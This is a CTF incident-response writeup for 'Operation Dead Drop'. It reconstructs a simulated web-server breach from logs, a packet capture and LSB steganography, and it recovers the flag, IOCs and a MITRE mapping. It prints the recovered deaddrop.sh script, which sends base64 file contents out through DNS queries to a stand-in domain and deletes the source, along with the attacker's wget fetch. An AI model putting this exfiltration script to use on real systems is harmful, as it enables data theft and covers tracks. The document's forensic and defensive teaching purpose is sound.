# Operation Dead Drop — Incident Response Writeup

**Category:** Incident Response / Forensics
**Points:** 20
**Flag:** `KPMG_CTF{tr4ce_the_intrud3r_follow_the_tr4il}`

---

## 1. Challenge Description

> Our monitoring system flagged unusual activity on one of the company's internet-facing servers. By the time the on-call engineer logged in, the attacker was gone, but they left traces behind.
>
> * `incident.pcap` – a network capture taken during the incident
> * `access.log` – the server's web access log
> * `server_image.png` – an image recovered from the server
>
> The attacker took data out of the network and covered their tracks. Reconstruct the attack and recover the flag.
> Flag format: `KPMG_CTF{...}`

---

## 2. Artifact Triage

```bash
$ file *
access.log:       ASCII text
incident.pcap:    pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 65535)
server_image.png: PNG image data, 1280 x 800, 8-bit/color RGB, non-interlaced

$ sha256sum *
b0474ae31b73e0df62a6d12b9fbe411de11517221559c76102b2ae2d30e66b97  access.log
35e1b62b28c29f4a47fc91eac5ef2fe7397b06cd31df7719f3d5c4f0c1fc979b  incident.pcap
3b88b3b310f5f8175d39c4b2aa359afc6cdfc68c1ad6149df05da85e2f2d87ba  server_image.png

$ ls -la
-rw-r--r-- 1 claude ubuntu  148408 access.log
-rw-r--r-- 1 claude ubuntu  258622 incident.pcap
-rw-r--r-- 1 claude ubuntu 1478104 server_image.png
```

A `strings` pass on the image already leaks a hint:

```
# deaddrop v1.2 - exfil over DNS
```

### Environment / hosts

| IP | Role |
|---|---|
| `192.168.56.20` | Compromised web server (`web01.northstar.local`) |
| `192.168.56.2` | Internal DNS resolver / monitoring host |
| `192.168.56.10–14` | Internal workstations (normal traffic) |
| `198.51.100.x` | External legitimate visitors |
| `203.0.113.77` | **Attacker** |

---

## 3. Access Log Analysis

### 3.1 Find the noisy / odd IP

```bash
$ wc -l access.log
1201 access.log

$ awk '{print $1}' access.log | sort | uniq -c | sort -rn | head
    360 192.168.56.2
    147 192.168.56.13
    142 192.168.56.12
    133 192.168.56.14
    130 192.168.56.11
    117 192.168.56.10
     26 203.0.113.77
      6 198.51.100.183
      5 198.51.100.102
      4 198.51.100.157
```

`192.168.56.2` is just the `monitor/1.0` health check every minute. `203.0.113.77` is the outlier, and it is the only source using the custom User-Agent `DeadDrop-Agent/1.0`.

### 3.2 All attacker requests

```bash
$ grep 203.0.113.77 access.log
```

```
203.0.113.77 - - [27/Sep/2026:01:40:30 +0530] "POST /admin/notes?tag=deaddrop&layers=rot13,base64 HTTP/1.1" 200 96 "-" "DeadDrop-Agent/1.0"
203.0.113.77 - - [27/Sep/2026:01:42:50 +0530] "GET /.env HTTP/1.1" 404 512 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
203.0.113.77 - - [27/Sep/2026:01:42:53 +0530] "GET /admin HTTP/1.1" 403 921 "-" "Mozilla/5.0 ..."
203.0.113.77 - - [27/Sep/2026:01:43:02 +0530] "GET /admin/login HTTP/1.1" 200 1882 "-" "Mozilla/5.0 ..."
203.0.113.77 - - [27/Sep/2026:01:43:05 +0530] "POST /admin/login HTTP/1.1" 401 612 "http://web01.northstar.local/admin/login" "Mozilla/5.0 ..."
203.0.113.77 - - [27/Sep/2026:01:43:07 +0530] "POST /admin/login HTTP/1.1" 401 612 "http://web01.northstar.local/admin/login" "Mozilla/5.0 ..."
203.0.113.77 - - [27/Sep/2026:01:43:12 +0530] "POST /admin/login HTTP/1.1" 200 943 "http://web01.northstar.local/admin/login" "Mozilla/5.0 ..."
203.0.113.77 - - [27/Sep/2026:01:43:20 +0530] "GET /admin HTTP/1.1" 200 6120 "-" "Mozilla/5.0 ..."
203.0.113.77 - - [27/Sep/2026:01:43:31 +0530] "GET /admin/users HTTP/1.1" 200 5230 "-" "Mozilla/5.0 ..."
203.0.113.77 - - [27/Sep/2026:01:44:10 +0530] "GET /robots.txt HTTP/1.1" 404 512 "-" "Mozilla/5.0 ..."
203.0.113.77 - - [27/Sep/2026:01:44:19 +0530] "GET /backup.zip HTTP/1.1" 404 921 "-" "Mozilla/5.0 ..."
203.0.113.77 - - [27/Sep/2026:01:44:28 +0530] "GET /server-status HTTP/1.1" 404 548 "-" "Mozilla/5.0 ..."
203.0.113.77 - - [27/Sep/2026:01:44:37 +0530] "GET /admin/config HTTP/1.1" 403 512 "-" "Mozilla/5.0 ..."
203.0.113.77 - - [27/Sep/2026:01:44:46 +0530] "GET /phpinfo.php HTTP/1.1" 404 921 "-" "Mozilla/5.0 ..."
203.0.113.77 - - [27/Sep/2026:01:44:55 +0530] "GET /api/v1/users HTTP/1.1" 404 548 "-" "Mozilla/5.0 ..."
203.0.113.77 - - [27/Sep/2026:01:45:04 +0530] "GET /.git/HEAD HTTP/1.1" 404 548 "-" "Mozilla/5.0 ..."
203.0.113.77 - - [27/Sep/2026:01:45:08 +0530] "GET /upload HTTP/1.1" 200 1432 "-" "Mozilla/5.0 ..."
203.0.113.77 - - [27/Sep/2026:01:47:05 +0530] "GET /admin/export?table=customers HTTP/1.1" 200 2412330 "-" "Mozilla/5.0 ..."
203.0.113.77 - - [27/Sep/2026:01:47:40 +0530] "GET /admin/export?table=credentials HTTP/1.1" 200 188412 "-" "Mozilla/5.0 ..."
203.0.113.77 - - [27/Sep/2026:01:49:15 +0530] "POST /admin/upload?file=deaddrop.sh HTTP/1.1" 200 214 "-" "DeadDrop-Agent/1.0"
203.0.113.77 - - [27/Sep/2026:01:51:58 +0530] "GET /uploads/server_image.png HTTP/1.1" 200 1478104 "-" "Mozilla/5.0 ..."
203.0.113.77 - - [27/Sep/2026:01:54:20 +0530] "GET /admin/logs HTTP/1.1" 200 48211 "-" "Mozilla/5.0 ..."
203.0.113.77 - - [27/Sep/2026:01:12:03 +0530] "GET /static/img/px.gif?part=1&d=X3ZhZ2VocTNl HTTP/1.1" 200 43 "-" "DeadDrop-Agent/1.0"
203.0.113.77 - - [27/Sep/2026:02:07:10 +0530] "POST /admin/clearlogs HTTP/1.1" 200 31 "-" "DeadDrop-Agent/1.0"
203.0.113.77 - - [27/Sep/2026:02:07:31 +0530] "GET / HTTP/1.1" 200 4312 "-" "Mozilla/5.0 ..."
203.0.113.77 - - [27/Sep/2026:03:00:20 +0530] "GET /static/img/px.gif?part=2&d=X3NieXliag== HTTP/1.1" 200 43 "-" "DeadDrop-Agent/1.0"
```

### 3.3 Key observations

1. **The decoding recipe is in the log itself:**
   `POST /admin/notes?tag=deaddrop&layers=rot13,base64` → data was rot13'd and then base64'd. To reverse it: **base64 decode, then rot13**.
2. **Two tracking-pixel beacons** (`/static/img/px.gif`) carry data in the `d=` parameter, numbered `part=1` and `part=2`.
3. **Log tampering:** the `part=1` beacon is stamped `01:12:03` but sits between `01:54:20` and `02:07:10`. Out-of-order timestamps are a classic sign of log manipulation, and it lands right before `POST /admin/clearlogs`.
4. **Data theft:** 2.4 MB `customers` export and 188 KB `credentials` export.
5. `server_image.png` was downloaded by the attacker; the size (1,478,104 bytes) matches the recovered artifact exactly.

### 3.4 Decoding the beacons

```bash
$ for s in X3ZhZ2VocTNl X3NieXliag==; do
    echo -n "$s -> "; echo $s | base64 -d | tee /dev/stderr | tr 'A-Za-z' 'N-ZA-Mn-za-m'; echo
  done
```

| Part | Raw `d=` | base64 → | rot13 → |
|---|---|---|---|
| 1 | `X3ZhZ2VocTNl` | `_vagehq3e` | **`_intrud3r`** |
| 2 | `X3NieXliag==` | `_sbyybj` | **`_follow`** |

---

## 4. PCAP Analysis

### 4.1 Protocol overview

```python
import dpkt, collections
c = collections.Counter()
for ts, b in dpkt.pcap.Reader(open('incident.pcap','rb')):
    ip = dpkt.ethernet.Ethernet(b).data
    if not isinstance(ip, dpkt.ip.IP): continue
    t = ip.data
    c[(type(t).__name__, getattr(t,'dport',None))] += 1
print(c.most_common(8))
```

```
[(('TCP', 22), 365), (('UDP', 53), 94), (('TCP', 80), 66), (('TCP', 443), 48),
 (('TCP', 34225), 48), (('ICMP', None), 30), (('UDP', 123), 10), ...]
```

Mostly SSH/TLS noise, DNS, ICMP pings from the monitor (payload `monitormonitor...`) and some HTTP. The interesting parts are HTTP and DNS.

Equivalent tshark commands:

```bash
tshark -r incident.pcap -Y http.request -T fields -e frame.number -e ip.src -e ip.dst -e http.request.uri
tshark -r incident.pcap -Y 'dns.flags.response == 0' -T fields -e frame.number -e ip.src -e dns.qry.name
```

### 4.2 Dropper download (frames 932–934)

```
932  192.168.56.20 -> 203.0.113.77  HTTP
GET /deaddrop.sh HTTP/1.1
Host: 203.0.113.77
User-Agent: Wget/1.21.2

934  203.0.113.77 -> 192.168.56.20  HTTP
HTTP/1.1 200 OK
Server: SimpleHTTP/0.6 Python/3.10.12
Content-Type: text/x-shellscript
Content-Length: 218
```

The web server itself pulled the script from the attacker's Python `http.server`. Recovered script:

```bash
#!/bin/bash
# deaddrop v1.2 - exfil over DNS
# usage: ./deaddrop.sh <file>
DATA=$(cat "${1:-/tmp/.note}" | base64 -w0)
dig +short "$DATA.deaddrop.example" @192.168.56.2
rm -f /tmp/.note
echo "[deaddrop] drop complete"
```

What it does:

* base64-encodes `/tmp/.note` (or a given file)
* leaks it as the leftmost label of a DNS query to `*.deaddrop.example` via the internal resolver `192.168.56.2`
* deletes the source file (anti-forensics)

### 4.3 DNS exfiltration (frames 975–980)

Out of 94 DNS packets, all lookups are normal domains (github.com, pypi.org, slack.com, etc.) except:

```
975  192.168.56.20 -> 192.168.56.2  Q  S1BNR19DVEZ7dHI0Y2VfdGhl.deaddrop.example
976  192.168.56.2  -> 192.168.56.20 R  S1BNR19DVEZ7dHI0Y2VfdGhl.deaddrop.example  A
977  192.168.56.20 -> 192.168.56.2  Q  S1BNR19DVEZ7dHI0Y2VfdGhl.deaddrop.example
978  192.168.56.2  -> 192.168.56.20 R  S1BNR19DVEZ7dHI0Y2VfdGhl.deaddrop.example  A
979  192.168.56.20 -> 192.168.56.2  Q  S1BNR19DVEZ7dHI0Y2VfdGhl.deaddrop.example
980  192.168.56.2  -> 192.168.56.20 R  S1BNR19DVEZ7dHI0Y2VfdGhl.deaddrop.example  A
```

The same query was sent three times (retries); one unique label.

```bash
$ echo S1BNR19DVEZ7dHI0Y2VfdGhl | base64 -d
KPMG_CTF{tr4ce_the
```

**Flag piece (start):** `KPMG_CTF{tr4ce_the`

---

## 5. Image Analysis (server_image.png)

### 5.1 Visual

The image is a fake "Scheduled Server Maintenance" banner for `web01.northstar.local`, engineer `svc_backup`, status "COMPLETED - no anomalies logged", with the caption "Snapshot of /var/www/uploads — Nothing to see here. Move along." The rack LEDs (green/orange) look like a binary pattern but are a **decoy**.

### 5.2 Structure check

```python
import struct
d = open('server_image.png','rb').read()
j = d.find(b'IEND') + 8
print('trailer', len(d) - j)
pos = 8
while pos < len(d):
    L = struct.unpack('>I', d[pos:pos+4])[0]; ty = d[pos+4:pos+8]
    if ty != b'IDAT': print(ty, L)
    pos += 12 + L
    if ty == b'IEND': break
```

```
trailer 0
b'IHDR' 13
b'IEND' 0
```

No appended data and no text/metadata chunks, so binwalk / exiftool will find nothing. Next step: pixel-level steganography.

### 5.3 LSB extraction

```python
from PIL import Image
import numpy as np, re

a = np.array(Image.open('server_image.png')).astype(np.uint8)
bits = (a & 1).reshape(-1)            # LSB of R,G,B in row-major order
by = np.packbits(bits[:len(bits)//8*8]).tobytes()   # MSB-first
print(re.search(rb'[ -~]{6,}', by).group())
```

```
b'DEAD_DROP::L52GQZK7ORZDI2LMPU======::END'
```

(Equivalent: `zsteg server_image.png` → `b1,rgb,msb,xy`.)

Scan results for other planes/channels were only random noise; only `bit0, RGB, MSB-first` produced a readable marker at offset 0.

The payload between the markers ends in `======` and uses only `A-Z2-7`, so it is base32:

```bash
$ echo L52GQZK7ORZDI2LMPU====== | base32 -d
_the_tr4il}
```

**Flag piece (end):** `_the_tr4il}`

---

## 6. Assembling the Flag

| Order | Source | Encoding | Value |
|---|---|---|---|
| 1 | PCAP — DNS query to `deaddrop.example` | base64 | `KPMG_CTF{tr4ce_the` |
| 2 | access.log — `px.gif?part=1` | base64 → rot13 | `_intrud3r` |
| 3 | access.log — `px.gif?part=2` | base64 → rot13 | `_follow` |
| 4 | server_image.png — LSB stego | base32 | `_the_tr4il}` |

```
KPMG_CTF{tr4ce_the + _intrud3r + _follow + _the_tr4il}
```

### Flag

```
KPMG_CTF{tr4ce_the_intrud3r_follow_the_tr4il}
```

---

## 7. Attack Timeline (27 Sep 2026, IST)

| Time | Event | Evidence |
|---|---|---|
| 01:40:30 | Attacker posts note revealing encoding layers `rot13,base64` | access.log |
| 01:42:50–01:43:02 | Recon: `/.env`, `/admin` (403), `/admin/login` | access.log |
| 01:43:05–01:43:12 | Credential brute force — 2× 401, then **200 (success)** | access.log |
| 01:43:20–01:45:08 | Admin panel browsing and further enumeration (`/backup.zip`, `/server-status`, `/phpinfo.php`, `/.git/HEAD`, `/upload`) | access.log |
| 01:47:05 | **Data theft:** `/admin/export?table=customers` (2.4 MB) | access.log |
| 01:47:40 | **Data theft:** `/admin/export?table=credentials` (188 KB) | access.log |
| 01:49:15 | Upload of `deaddrop.sh` via `/admin/upload` | access.log |
| — | Server fetches `deaddrop.sh` from `203.0.113.77` with wget | pcap frames 932–934 |
| — | **DNS exfil** of `/tmp/.note` to `*.deaddrop.example`; `.note` deleted | pcap frames 975–980 |
| 01:51:58 | Attacker downloads stego image `server_image.png` | access.log |
| 01:54:20 | Views `/admin/logs` | access.log |
| (stamped 01:12:03) | `px.gif?part=1` beacon — **out-of-order timestamp, log tampered** | access.log |
| 02:07:10 | **Anti-forensics:** `POST /admin/clearlogs` | access.log |
| 02:07:31 | Final check of `/` | access.log |
| 03:00:20 | `px.gif?part=2` beacon | access.log |

---

## 8. Indicators of Compromise

| Type | Value |
|---|---|
| Attacker IP | `203.0.113.77` |
| User-Agent | `DeadDrop-Agent/1.0` |
| Exfil domain | `*.deaddrop.example` |
| Malicious script | `deaddrop.sh` (served by `SimpleHTTP/0.6 Python/3.10.12`) |
| Staging file | `/tmp/.note` (deleted by script) |
| Beacon URL | `/static/img/px.gif?part=N&d=<base64>` |
| Stego file | `/var/www/uploads/server_image.png` (SHA256 `3b88b3b3...87ba`) |
| Abused endpoints | `/admin/login`, `/admin/export`, `/admin/upload`, `/admin/notes`, `/admin/clearlogs` |

---

## 9. MITRE ATT&CK Mapping

| Technique | ID | Observed |
|---|---|---|
| Active Scanning / Wordlist Scanning | T1595.003 | `.env`, `.git/HEAD`, `backup.zip`, `phpinfo.php` |
| Brute Force: Password Guessing | T1110.001 | 2 failed + 1 successful `/admin/login` |
| Valid Accounts | T1078 | Admin session used for export/upload |
| Data from Information Repositories | T1213 | `customers` / `credentials` exports |
| Ingress Tool Transfer | T1105 | wget `deaddrop.sh` from attacker |
| Exfiltration Over Alternative Protocol: DNS | T1048.003 | base64 label in `deaddrop.example` query |
| Exfiltration Over Web Service / C2 | T1041 | `px.gif?d=` beacons |
| Steganography | T1027.003 | LSB payload in PNG |
| Obfuscated Files or Information | T1027 | rot13 + base64, base32 |
| Indicator Removal: Clear Logs | T1070.002 | `/admin/clearlogs`, timestamp tampering |
| Indicator Removal: File Deletion | T1070.004 | `rm -f /tmp/.note` |

---

## 10. Recommendations

1. Block `203.0.113.77` and the `deaddrop.example` domain; alert on the `DeadDrop-Agent` User-Agent.
2. Rotate all admin and user credentials — the `credentials` table was exported. Notify affected customers per data-breach obligations.
3. Add rate limiting / lockout and MFA on `/admin/login`.
4. Restrict outbound traffic from the web server (it should not wget from the internet) and restrict which hosts may use the internal resolver for external lookups.
5. Monitor DNS for long/high-entropy subdomain labels.
6. Ship logs to a remote, append-only SIEM so a local `clearlogs` cannot erase evidence; remove or protect the `/admin/clearlogs` endpoint.
7. Validate and sandbox uploads; disallow executable script uploads via `/admin/upload`.
